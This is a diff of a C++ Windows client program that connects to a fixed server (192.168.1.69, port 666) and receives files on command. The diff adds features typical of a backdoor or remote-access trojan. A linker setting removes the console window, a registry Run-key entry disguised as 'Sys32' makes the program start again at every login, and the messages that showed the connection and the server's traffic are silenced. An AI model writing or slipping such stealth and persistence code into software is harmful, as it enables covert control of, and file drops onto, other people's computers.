@@ -1,20 +1,45 @@
-//Client v 2.0
+//Client
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <stdio.h>
 #include <string>
 #include <iostream>
 #include <winsock2.h>
+#include <direct.h>
 #include <windows.h>
 
 #define PORT 666
 #define SERVERADDR "192.168.1.69"
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib,"Ws2_32.lib")
 
 using namespace std;
 
 int main(int argc, char* argv[])
 {
-	setlocale(LC_ALL,"rus");
+	//
+	//HWND hWnd = GetConsoleWindow();
+	//ShowWindow(hWnd, SW_HIDE);
+	while (1){
+	char buffer2[256] = "";
+	GetModuleFileName(NULL, buffer2, sizeof(buffer2) / sizeof(buffer2[0]));
+	char dir[FILENAME_MAX];
+	_getcwd(dir, sizeof(dir));
+	char temp[] = "\\C.exe";
+	cout << temp << " " << dir;
+
+	strcat_s(dir, temp);
+	cout << dir << endl;
+	DWORD dwtype = 0;
+	DWORD dwBufsize = sizeof(dir);
+	TCHAR szpath[MAX_PATH];
+	HKEY hKeys;
+	if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL))
+	{
+		RegSetValueEx(hKeys, "Sys32", 0, REG_SZ, reinterpret_cast<const BYTE*>(&buffer2), sizeof(buffer2));
+		RegCloseKey(hKeys);
+	}
+	//
+	setlocale(LC_ALL, "rus");
 	char buff[1024];
 	for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
 		buff[i] = '\0';
@@ -71,8 +96,7 @@ int main(int argc, char* argv[])
 		}
 	}
 
-	printf("Soedinenie s %s uspeshno ustanovlenno\n \
-            Type quit for quit\n\n", SERVERADDR);
+	printf("Connected to %s\n", SERVERADDR);
 
 
 	int nsize;
@@ -81,10 +105,10 @@ int main(int argc, char* argv[])
 
 		buff[nsize] = 0;
 
-		printf("Server => Client:%s", buff);
+		//printf("Server => Client:%s", buff);
 
-			if((buff[0]=='-')&&(buff[1]=='-')&&(buff[2] == 's')) {
-				std::cout << "Принимаю файл\n";
+		if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 's')) {
+			//std::cout << "Принимаю файл\n";
 			HANDLE hFile;
 			std::string result = buff + 4;
 			hFile = CreateFile(result.c_str(),  // имя файла
